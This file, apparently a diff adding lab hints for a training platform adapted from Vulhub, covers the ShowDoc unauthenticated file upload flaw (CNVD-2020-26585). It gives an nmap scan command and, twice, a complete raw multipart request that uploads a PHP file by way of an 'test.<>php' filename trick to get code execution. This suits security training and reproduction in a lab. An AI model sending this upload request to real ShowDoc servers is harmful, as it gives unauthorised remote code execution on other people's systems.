@@ -1,0 +1,112 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: showdoc/CNVD-2020-26585
+hint_levels:
+  low:
+  - Inspect the showdoc service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
+  high:
+  - 'Vulnerability: ShowDoc Unauthenticated File Upload and Remote Code Execution (CNVD-2020-26585).'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Exploit
+
+    Simply send following request to upload a PHP file:
+
+    ```
+    POST /index.php?s=/home/page/uploadImg HTTP/1.1
+    Host: {{NODE_IP}}:8080
+    Accept-Encoding: gzip, deflate, br
+    Accept: */*
+    Accept-Language: en-US;q=0.9,en;q=0.8
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+    Connection: close
+    Cache-Control: max-age=0
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl
+
+    ------WebKitFormBoundary0RdOKBR8AmAxfRyl
+    Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+    Content-Type: text/plain
+
+    <?=phpinfo();?>
+    ------WebKitFormBoundary0RdOKBR8AmAxfRyl--
+
+    ```
+
+    PHP file address will be respond:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/showdoc/CNVD-2020-26585/1.png
+
+    `phpinfo()` is executed successfully:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/showdoc/CNVD-2020-26585/2.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/showdoc/CNVD-2020-26585/README.md'
+  - |-
+    Additional public references:
+    - https://github.com/star7th/showdoc/pull/1059
+    - https://github.com/star7th/showdoc/commit/fb77dd4db88dc23f5e570fc95919ee882aca520a
+    - https://github.com/star7th/showdoc/commit/e1cd02a3f98bb227c0599e7fa6b803ab1097597f
+access_instructions:
+  title: ShowDoc Unauthenticated File Upload and Remote Code Execution (CNVD-2020-26585)
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080`.
+  - title: Exploit
+    instructions: |-
+      Simply send following request to upload a PHP file:
+
+      ```
+      POST /index.php?s=/home/page/uploadImg HTTP/1.1
+      Host: {{NODE_IP}}:8080
+      Accept-Encoding: gzip, deflate, br
+      Accept: */*
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+      Connection: close
+      Cache-Control: max-age=0
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl
+
+      ------WebKitFormBoundary0RdOKBR8AmAxfRyl
+      Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+      Content-Type: text/plain
+
+      <?=phpinfo();?>
+      ------WebKitFormBoundary0RdOKBR8AmAxfRyl--
+
+      ```
+
+      PHP file address will be respond:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/showdoc/CNVD-2020-26585/1.png
+
+      `phpinfo()` is executed successfully:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/showdoc/CNVD-2020-26585/2.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/showdoc/CNVD-2020-26585/README.md
+  readme_sha256: ce006cf728f586f6f961f68c531df2cfc1cdb04e899f71e2514bad6470ec2f42
+  compose_sha256: e36e0165d803e6f12e52fa938478b312130db86c02fa7d926cb9929c8b363910
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
